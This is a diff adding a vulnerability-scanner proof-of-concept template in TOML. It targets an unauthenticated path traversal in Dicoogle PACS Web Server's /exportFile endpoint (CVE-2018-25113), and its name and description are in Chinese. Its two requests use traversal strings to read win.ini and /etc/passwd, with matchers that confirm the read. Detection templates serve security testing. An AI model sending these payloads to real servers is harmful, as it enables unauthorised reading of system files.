@@ -1,0 +1,41 @@
+[info]
+id = "POC-AVE-2018-0042"
+name = "Dicoogle PACS Web Server 路径遍历 PoC"
+author = "AVE"
+severity = "high"
+tags = ["path-traversal", "lfi", "cve-2018-25113"]
+description = "Dicoogle PACS Web Server 2.5.0 的 /exportFile 端点存在未经身份验证的路径遍历漏洞，攻击者可利用 UID 参数读取服务器任意文件。"
+vuln_id = ["CVE-2018-25113", "AVE-2018-0042"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/exportFile"
+headers = { User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
+
+[[poc.requests.query]]
+name = "UID"
+value = "../../../../../../../../../../windows/win.ini"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["bit app support", "fonts", "extensions"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/exportFile"
+headers = { User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
+
+[[poc.requests.query]]
+name = "UID"
+value = "../../../../../../../../../../etc/passwd"
+
+[[poc.requests.matchers]]
+type = "regex"
+part = "body"
+words = ["root:.*:0:0:"]
+expect = true
